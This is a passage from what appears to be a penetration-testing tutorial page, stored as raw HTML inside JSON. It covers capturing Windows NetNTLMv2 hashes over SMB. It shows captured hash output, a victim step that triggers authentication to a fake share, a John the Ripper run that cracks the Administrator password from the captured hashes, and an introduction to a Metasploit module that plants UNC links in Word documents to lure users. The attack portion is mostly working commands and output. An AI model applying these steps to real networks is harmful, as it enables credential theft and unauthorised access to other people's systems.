DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:dc28e9e94c6199e814937d61e3956c7d \nNT_CLIENT_CHALLENGE:0101000000000000084fd1a7a774d5014f34895403460b1b00000000020000000000000000000000</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Victim:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Open Explorer and type \\\\fake</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Finally, Crack the password:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># john /tmp/johnnbns_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\n6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz\nUse the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably\nSession completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"word-document-unc-injector\" style=\"position:relative;\"><a href=\"#word-document-unc-injector\" aria-label=\"word document unc injector permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Word Document UNC Injector</h3>\n<p>Another strategy is to create content which can entice a user to open, containing a UNC link, and\nthus creating an SMB connection.  To accomplish this, we use <code class=\"language-text\">auxiliary/docx/word_unc_injector</code>.</p>"}}},"pageContext":{"id":"340ab624-c8ee-5ea4-aa85-19bb0d86ec68"}}}